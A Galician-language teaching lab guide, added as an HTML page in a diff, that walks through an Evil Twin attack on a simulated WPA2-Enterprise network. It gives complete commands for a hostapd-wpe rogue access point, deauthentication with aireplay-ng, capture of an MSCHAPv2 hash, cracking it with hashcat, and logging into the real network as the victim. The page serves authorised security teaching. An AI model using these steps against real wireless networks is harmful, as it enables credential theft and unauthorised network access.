@@ -1,0 +1,213 @@
+<!doctype html><html lang="gl"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Guía da práctica 2.2 — Evil Twin WPA2-Enterprise (EAP)</title><style>
+:root{color-scheme:light dark}body{font:16px/1.58 system-ui,Arial;margin:0;background:#f7f9fb;color:#1c2e3d}.wrap{max-width:940px;margin:0 auto;padding:22px 28px 70px}a{color:#1460a0}header{position:sticky;top:0;background:#12334d;color:#fff;padding:12px 26px}header a{color:#fff}article{background:white;border-radius:16px;padding:25px 36px;box-shadow:0 4px 20px #18364f11}h1{font-size:1.7rem;line-height:1.25}h2{font-size:1.35rem;margin-top:2rem;border-bottom:1px solid #d7e0e7;padding-bottom:.4rem}h3{font-size:1.1rem}pre{padding:14px 18px;background:#11283a;color:#e4f5ff;overflow:auto;border-radius:9px;white-space:pre}pre code{font:13px/1.5 ui-monospace,Consolas,monospace}p code,li code{background:#e8eff5;padding:2px 4px;border-radius:4px}table{border-collapse:collapse;display:block;overflow:auto}td,th{border:1px solid #d4e0ea;padding:8px;text-align:left}img{max-width:100%;height:auto}blockquote{border-left:4px solid #14a3b8;padding:2px 12px;background:#eff7f9}.notice{padding:10px 15px;border-left:4px solid #16a5bd;background:#eff9fc;border-radius:6px}.notice.warning{border-color:#db7e26;background:#fff7eb}.notice strong{display:block} @media(max-width:640px){.wrap{padding:12px}article{padding:15px}} </style><header><a href="../index.html">← Volver ao laboratorio interactivo</a> · Guía docente validada</header><main class="wrap"><article><h1>Guía da práctica 2.2 — Evil Twin WPA2-Enterprise (EAP)</h1>
+<div class="notice warning"><strong>Consideracións técnicas antes dos comandos</strong>
+<p>No escenario <code>eap_evil_twin</code>, FreeRADIUS está no <em>namespace</em> <code>wifi_ap_wlan0</code>; os rexistros detallados poden aparecer en <code>/var/log/freeradius/radius.log</code>. O cliente de probas pode omitir <code>ca_cert</code> deliberadamente, pero <strong>asociación coa rede lexítima non equivale a captura de credenciais polo Evil Twin</strong>. Distingue na evidencia o inicio do AP falso, a asociación real ao BSSID falso e o éxito da negociación EAP. Non se debe concluír que se capturaron credenciais se só se observa <code>AP-ENABLED</code>.</p>
+</div>
+<div class="notice important"><strong>Baseada na práctica [2-Taller-HE-Practica-WiFi-2.pdf](https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/2-Taller-HE-Practica-WiFi-2.pdf){:target=&quot;_blank&quot;}</strong>
+</div>
+<h2>1. Contexto e Obxectivos</h2>
+<p>Nesta práctica simularemos un ataque de <strong>Evil Twin</strong> contra unha infraestrutura WPA2-Enterprise (802.1X/EAP). O atacante monta un AP falso co mesmo SSID que o lexítimo para engañar ao cliente e capturar as súas credenciais.</p>
+<p>Para que o ataque funcione deben cumprirse tres condicions simultaneamente:</p>
+<ol>
+<li><strong>Cliente mal configurado</strong>: o <code>ca_cert</code> debe estar ausente ou comentado no <code>wpa_supplicant.conf</code> do cliente. Sen esta validación o cliente acepta calquera certificado, incluíndo os falsos do Evil Twin.</li>
+<li><strong>SSID duplicado</strong>: o Evil Twin emite o mesmo SSID (<code>EMPRESA-XYZ</code>) que o AP lexítimo, pero nun canal diferente (canal 1 vs canal 6).</li>
+<li><strong>Desautenticación</strong>: o cliente é expulsado do AP lexítimo e, ao buscar reconectarse, escolle o Evil Twin.</li>
+</ol>
+<p>O obxectivo final é capturar o <strong>hash MSCHAPv2</strong> das credenciais do usuario, crackealo con <code>hashcat</code> e, finalmente, usar esas credenciais para conectarnos á rede real suplantando a identidade da vítima.</p>
+<hr />
+<h2>2. Mapeamento: PDF ↔ Laboratorio</h2>
+<p>O PDF da práctica describe o procedemento usando 4 &quot;Consolas&quot; independentes. No laboratorio provisionado por <code>wifilabctl</code>, o estado do AP lexítimo e do cliente xa está configurado e activo de forma automática. O estudante unicamente debe actuar sobre as outras dúas, abrindo terminais na VM Kali.</p>
+<p>| PDF | Rol | Interface | Namespace | Estado tras <code>wifilabctl up</code> | Acción do estudante |
+|---|---|---|---|---|---|
+| Consola 1 | AP lexítimo + FreeRADIUS | <code>wlan0</code> | <code>wifi_ap_wlan0</code> | ✅ Automático (hostapd + freeradius en execución) | Nada |
+| Consola 2 | Cliente vulnerable | <code>wlan1</code> | <code>wifi_cliente_wlan1</code> | ✅ Automático (wpa_supplicant conectado ao AP lexítimo) | Nada |
+| Consola 3 | Evil Twin (AP Rogue) | <code>wlan2</code> | <code>evil_twin_wlan2</code> | ⏳ Namespace creado, interface lista, sen servizo | <strong>→ Terminal 1</strong> |
+| Consola 4 | Monitor + Desautenticación | <code>wlan3</code> | (namespace PRINCIPAL) | ⏳ Interface libre no namespace global | <strong>→ Terminal 2</strong> |</p>
+<hr />
+<h2>3. Preparación do Escenario</h2>
+<p>Abre <strong>unha terminal</strong> na VM Kali e executa:</p>
+<pre><code class="language-bash">sudo wifilabctl up eap_evil_twin
+sudo wifilabctl status
+</code></pre>
+<p>Comproba que o estado é correcto: deben aparecer os namespaces <code>wifi_ap_wlan0</code>, <code>wifi_cliente_wlan1</code> e <code>evil_twin_wlan2</code>, e a interface <code>wlan3</code> debe estar libre no namespace global.</p>
+<hr />
+<h2>4. Terminal 1 — Evil Twin (PDF: Consola 3, Páx. 7)</h2>
+<p>Esta terminal corresponde á <strong>Consola 3 do PDF</strong>. Aquí montaremos o AP Rogue usando <code>hostapd-wpe</code>.</p>
+<blockquote>
+<p>⚠️ <strong>Aviso:</strong> <code>hostapd-wpe</code> executa en primeiro plano e non regresa ata que premes <code>Ctrl+C</code>. Esta terminal quedará ocupada mentres o Evil Twin está activo. Non a peches.</p>
+</blockquote>
+<h3>4.1. Entrar no namespace do atacante</h3>
+<pre><code class="language-bash">sudo ip netns exec evil_twin_wlan2 bash
+</code></pre>
+<p>A partir deste momento todos os comandos desta terminal se executan dentro do namespace <code>evil_twin_wlan2</code>, illado do resto do sistema.</p>
+<h3>4.2. Preparar a interface wlan2</h3>
+<pre><code class="language-bash">ip link set lo up
+ip link set wlan2 down
+macchanger -m f0:4d:a2:84:3e:2d wlan2
+ip link set wlan2 up
+</code></pre>
+<p>Cambiamos a MAC de <code>wlan2</code> para que non sexa identificada facilmente como a interface simulada orixinal. <code>macchanger</code> require que a interface estea caída primeiro.</p>
+<h3>4.3. Verificar os certificados xerados por bootstrap</h3>
+<p>O <code>wifilabctl</code> xa executou <code>./bootstrap</code> en <code>/etc/hostapd-wpe/certs/</code> durante o arranque do escenario, xerando os certificados falsos. Verifica que existen:</p>
+<pre><code class="language-bash">ls /etc/hostapd-wpe/certs/
+</code></pre>
+<p>Debes ver, entre outros: <code>ca.pem</code>, <code>server.pem</code>, <code>server.key</code>, <code>dh</code>.</p>
+<h3>4.4. Crear a configuración do Evil Twin</h3>
+<pre><code class="language-bash">cat &gt; evil-twin-wpe.conf &lt;&lt;'EOF'
+interface=wlan2
+driver=nl80211
+ssid=EMPRESA-XYZ
+channel=1
+hw_mode=g
+wpa=2
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=CCMP
+rsn_pairwise=CCMP
+ieee8021x=1
+eap_server=1
+eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
+ca_cert=/etc/hostapd-wpe/certs/ca.pem
+server_cert=/etc/hostapd-wpe/certs/server.pem
+private_key=/etc/hostapd-wpe/certs/server.key
+dh_file=/etc/hostapd-wpe/certs/dh
+logger_syslog=-1
+logger_syslog_level=2
+logger_stdout=-1
+logger_stdout_level=2
+EOF
+</code></pre>
+<p>Puntos clave da configuración:</p>
+<ul>
+<li><code>ssid=EMPRESA-XYZ</code>: mesmo SSID do AP lexítimo. Isto é esencial para que o cliente se conecte ao noso AP pensando que é o real.</li>
+<li><code>channel=1</code>: canal diferente ao do AP lexítimo (canal 6). Isto evita interferencias e permite distinguir os dous APs no monitor.</li>
+<li><code>eap_server=1</code>: activa o servidor EAP integrado de <code>hostapd-wpe</code>. Non se usa un RADIUS externo; o Evil Twin contesta directamente as peticións de autenticación.</li>
+<li><code>eap_user_file</code>: ficheiro de usuarios EAP que acepta calquera credencial (usuario comodín <code>*</code>). Foi xerado polo laboratorio durante o aprovisionamento.</li>
+<li><code>server_cert</code> e <code>private_key</code>: certificados <strong>falsos</strong> xerados por <code>./bootstrap</code>. Son certificados autofirmados que o cliente vulnerable acepta sen validar porque ten <code>ca_cert</code> comentado no seu <code>wpa_supplicant.conf</code>.</li>
+</ul>
+<h3>4.5. Lanzar o Evil Twin</h3>
+<pre><code class="language-bash">hostapd-wpe evil-twin-wpe.conf 2&gt;&amp;1 | tee evil-twin-credentials.log
+</code></pre>
+<p>A saída esperada é:</p>
+<pre><code>wlan2: interface state UNINITIALIZED-&gt;ENABLED
+wlan2: AP-ENABLED
+</code></pre>
+<p>O Evil Twin agora está emitindo beacons co SSID <code>EMPRESA-XYZ</code> no canal 1. Calquera credencial que un cliente envíe durante a autenticación EAP será capturada e gardada en <code>evil-twin-credentials.log</code>.</p>
+<blockquote>
+<p>🔔 <strong>Non pechar esta terminal.</strong> Pasamos á Terminal 2 para realizar a desautenticación.</p>
+</blockquote>
+<hr />
+<h2>5. Terminal 2 — Monitor e Desautenticación (PDF: Consola 4, Páx. 8)</h2>
+<p>Esta terminal corresponde á <strong>Consola 4 do PDF</strong>. Abre unha <strong>segunda terminal</strong> na VM Kali. Esta executa no namespace PRINCIPAL (sen <code>ip netns exec</code>), onde está libre a interface <code>wlan3</code>.</p>
+<h3>5.1. Activar modo monitor en wlan3</h3>
+<pre><code class="language-bash">sudo macchanger -m f0:4d:a2:84:3e:2e wlan3
+sudo ip link set wlan3 up
+sudo airmon-ng start wlan3
+</code></pre>
+<h3>5.2. Fixar a canle 6 en wlan3mon</h3>
+<p><code>airmon-ng</code> por defecto pon a interface en modo monitor pero <strong>non fixa ningunha canle</strong>: vai saltando entre todas as canles automaticamente. Para poder identificar clientes e desautenticar no canal do AP lexítimo (canal 6), é imprescindible fixalo:</p>
+<pre><code class="language-bash">sudo iw dev wlan3mon set channel 6
+</code></pre>
+<p>Verifica que se aplicou correctamente:</p>
+<pre><code class="language-bash">sudo iw dev wlan3mon info
+</code></pre>
+<p>A saída debe mostrar <code>channel 6 (2437 MHz)</code>.</p>
+<h3>5.3. Recoñecemento: identificar os dous APs</h3>
+<pre><code class="language-bash">sudo airodump-ng wlan3mon 
+</code></pre>
+<p>Debes ver <strong>dous APs</strong> co mesmo SSID <code>EMPRESA-XYZ</code> (o Evil Twin no canal 1 pode aparecer ou non dependendo do salto de canle):</p>
+<p>| BSSID | Canal | SSID | Rol |
+|---|---|---|---|
+| <code>XX:XX:XX:XX:XX:XX</code> | 6 | EMPRESA-XYZ | AP lexítimo (wlan0) |
+| <code>YY:YY:YY:YY:YY:YY</code> | 1 | EMPRESA-XYZ | Evil Twin (wlan2) |</p>
+<p>Na sección <code>STATIONS</code> verás a MAC do cliente (<code>wlan1</code>) asociada ao BSSID do AP lexítimo.</p>
+<p>Anota o <strong>BSSID do AP lexítimo</strong> e a <strong>MAC do cliente</strong>. Preme <code>Ctrl+C</code> para deter.</p>
+<blockquote>
+<p><em>NOTA</em>: Filtrar polo canal 6 para atopar rapidamente o cliente conectado:</p>
+<pre><code class="language-bash">sudo airodump-ng wlan3mon -c 6
+</code></pre>
+</blockquote>
+<h3>5.4. Desautenticar o cliente</h3>
+<pre><code class="language-bash">sudo aireplay-ng --deauth 20 -a &lt;BSSID_AP_LEXITIMO&gt; -c &lt;MAC_CLIENTE&gt; wlan3mon
+</code></pre>
+<p>Substituíndo os valores anotados anteriormente. A opción <code>--deauth 20</code> envía 20 ráfagas de paquetes de desautenticación dirixidos. O cliente é expulsado do AP lexítimo e <code>wpa_supplicant</code> inicia a búsqueda automática de reconexión. Como o Evil Twin está activo co mesmo SSID, o cliente conectará a el.</p>
+<blockquote>
+<p>⚠️ <strong>Nota:</strong> Se <code>aireplay-ng</code> amosa <code>No such BSSID available</code> ou non envía paquetes, verifica que <code>wlan3mon</code> segue na canle 6 con <code>sudo iw dev wlan3mon info</code>. Pode ser necesario volver a executar <code>sudo iw dev wlan3mon set channel 6</code> se a canle mudou.</p>
+</blockquote>
+<blockquote>
+<p>🔄 <strong>Volta á Terminal 1</strong> para ver as credenciais capturadas.</p>
+</blockquote>
+<hr />
+<h2>6. Terminal 1 — Extracción e Auditoría do Hash (PDF: Consola 3, Páx. 9)</h2>
+<p>Cando o cliente se conecte ao Evil Twin, <code>hostapd-wpe</code> captura o intercambio MSCHAPv2 e o amosa directamente na terminal onde está en execución. Verás algo así:</p>
+<pre><code>wlan2: STA a2:c7:77:12:28:c1 IEEE 802.1X: Identity received from STA: 'ana'
+
+mschapv2: Sat Jan 31 17:12:15 2026
+         username:      ana
+         challenge:     e7:0a:88:fc:72:b2:f8:3f
+         response:      de:89:e6:82:92:9a:6b:c1:70:ed:42:33:e8:86:7e:24:ec:0f:42:9d:a9:17:72:b5
+         jtr NETNTLM:           ana:$NETNTLM$e70a88fc72b2f83f$de89e682929a6bc170ed4233e8867e24ec0f429da91772b5
+         hashcat NETNTLM:       ana::::de89e682929a6bc170ed4233e8867e24ec0f429da91772b5:e70a88fc72b2f83f
+</code></pre>
+<p>O que ver aquí é:</p>
+<ul>
+<li><code>username</code>: identidade enviada polo cliente durante a fase EAP (Identity).</li>
+<li><code>challenge</code>: valor aleatorio enviado polo servidor EAP ao cliente.</li>
+<li><code>response</code>: hash que o cliente calcula aplicando MSCHAPv2 ao challenge usando o seu contrasinal real.</li>
+<li>As liñas <code>jtr</code> e <code>hashcat</code> son formatos directamente usables polas ferramentas de cracking.</li>
+</ul>
+<p>Preme <code>Ctrl+C</code> para deter <code>hostapd-wpe</code> e recuperar o prompt. Agora extraemos e crackeamos o hash:</p>
+<h3>6.1. Extraer o hash para hashcat</h3>
+<pre><code class="language-bash">grep &quot;hashcat NETNTLM&quot; evil-twin-credentials.log | awk '{print $3}' &gt; evil-hash.txt
+cat evil-hash.txt
+</code></pre>
+<p>Debe mostrar unha liña no formato: <code>ana::::&lt;response&gt;:&lt;challenge&gt;</code></p>
+<h3>6.2. Crackear con hashcat (<a href="apuntamentos/modo-5500.html">Modo 5500 — NetNTLMv1</a></h3>
+<pre><code class="language-bash">gunzip -c /usr/share/wordlists/rockyou.txt.gz &gt; /tmp/rockyou.txt
+hashcat -m 5500 evil-hash.txt /tmp/rockyou.txt
+</code></pre>
+<p>O modo <code>5500</code> é específico para hashes NetNTLMv1 / NetNTLMv1+ESS, que é o formato que xera MSCHAPv2. O resultado esperado é:</p>
+<pre><code>ana::::de89e682929a6bc170ed4233e8867e24ec0f429da91772b5:e70a88fc72b2f83f:1234
+</code></pre>
+<p>O contrasinal crackeado é <code>1234</code>.</p>
+<h3>6.3. Mostrar o resultado</h3>
+<pre><code class="language-bash">hashcat -m 5500 evil-hash.txt /tmp/rockyou.txt --show
+</code></pre>
+<hr />
+<h2>7. Terminais 1 e 2 — Acceso á Rede Suplantando a Identidade (Fase Final)</h2>
+<p>Xa temos as credenciais de Ana (<code>ana</code> / <code>1234</code>). O obxectivo final é demostrar que podemos conectarnos á <strong>rede corporativa real</strong> suplantando a súa identidade.</p>
+<p>Seguimos dentro do namespace <code>evil_twin_wlan2</code> e <code>wlan2</code> está libre tras deter <code>hostapd-wpe</code>.</p>
+<h3>7.1. Crear o ficheiro de conexión (Terminal 1)</h3>
+<pre><code class="language-bash">cat &gt; wpa_suplantacion.conf &lt;&lt;'EOF'
+network={
+    ssid=&quot;EMPRESA-XYZ&quot;
+    key_mgmt=WPA-EAP
+    eap=PEAP
+    identity=&quot;ana&quot;
+    password=&quot;1234&quot;
+    phase2=&quot;auth=MSCHAPV2&quot;
+}
+EOF
+</code></pre>
+<p>Nótese que non incluímos <code>ca_cert</code>: exactamente a mesma vulnerabilidade que tiña o cliente orixinal. Se a rede corporativa esixise validación de certificados, este paso fallaría.</p>
+<h3>7.2. Conectar ao AP lexítimo como Ana (Terminal 1)</h3>
+<pre><code class="language-bash">wpa_supplicant -Dnl80211 -iwlan2 -c wpa_suplantacion.conf
+</code></pre>
+<h3>7.3. Verificar a conexión (Terminal 2)</h3>
+<p>Comprobamos:</p>
+<pre><code class="language-bash">sudo ip netns exec evil_twin_wlan2 iw dev wlan2 link
+</code></pre>
+<p>A saída debe mostrar <code>Connected to &lt;BSSID&gt;</code> e <code>freq: 2437</code> (canal 6, o do AP lexítimo), confirmando que estamos conectados á rede real como Ana.</p>
+<hr />
+<h2>8. Limpeza</h2>
+<pre><code class="language-bash">sudo wifilabctl reset
+</code></pre>
+<hr />
+<h2>9. Conclusión</h2>
+<p>O ataque tivo éxito porque cumpríronse as tres condicións necesarias simultaneamente:</p>
+<ol>
+<li><strong>O cliente non validaba certificados</strong> (<code>ca_cert</code> comentado). Isto permitiu que aceptara os certificados falsos do Evil Twin sen ningún aviso.</li>
+<li><strong>O Evil Twin usaba o mesmo SSID</strong> que o AP lexítimo. O cliente non puido distinguir entre ambos e, tras ser expulsado, conectou ao noso AP.</li>
+<li><strong>A desautenticación forzou a reconexión</strong>. <code>aireplay-ng</code> expulsou ao cliente do AP lexítimo e <code>wpa_supplicant</code> reconectou automaticamente ao Evil Twin por ter mellor sinal ou por ser o único AP dispoñible naquele instante.</li>
+</ol>
+<p>O resultado foi a captura completa do hash MSCHAPv2, o cracking do contrasinal e o acceso á infraestrutura real coas credenciais da vítima.</p>
+</article><p>Fonte: Markdown orixinal de <code>20261121_docs.he-ud2.zip</code>. O procedemento debe executarse exclusivamente no laboratorio docente autorizado.</p></main></html>
